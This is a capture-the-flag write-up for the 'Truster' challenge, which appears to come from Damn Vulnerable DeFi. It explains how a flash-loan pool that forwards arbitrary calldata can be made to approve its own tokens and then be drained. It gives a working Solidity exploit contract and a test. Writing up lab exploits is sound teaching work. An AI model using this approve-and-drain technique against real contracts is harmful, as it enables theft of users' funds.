# Truster

## Challenge Overview

The `TrusterLenderPool` contract offers flash loans of DVT tokens for free. 

In a single transaction, rescue the 1 million DVT in the lending pool and send it to the recovery account.

## Vulnerability Analysis

`flashLoan` forwards arbitrary `target` and calldata provided by the borrower. This effectively gives the borrower an unrestricted external call executed from `TrusterLenderPool`, allowing the pool to be coerced into approving its own DVT and then drained via `transferFrom`.

## Exploit Strategy

The exploit is executed by calling `flashLoan` with the DVT token as the external call `target` and supplying calldata that makes the pool execute `approve`.

`TrusterRecoverer` is used to execute the exploit and send the rescued funds to the recovery account.

```solidity
contract TrusterRecoverer {
    function recover(TrusterLenderPool pool, DamnValuableToken token, address recovery, uint256 amount) external {
        bytes memory callData = abi.encodeWithSelector(
            pool.flashLoan.selector,
            0,
            recovery,
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                amount
            )
        );

        address(pool).call(callData);
        token.transferFrom(address(pool), recovery, amount);
    }
}
```

## Proof of Concept

```solidity
function test_truster() public checkSolvedByPlayer {
    TrusterRecoverer recoverer = new TrusterRecoverer();
    recoverer.recover(pool, token, recovery, TOKENS_IN_POOL);
}
```

## Result

The pool's DVT will be transfered out into the `recovery` address.
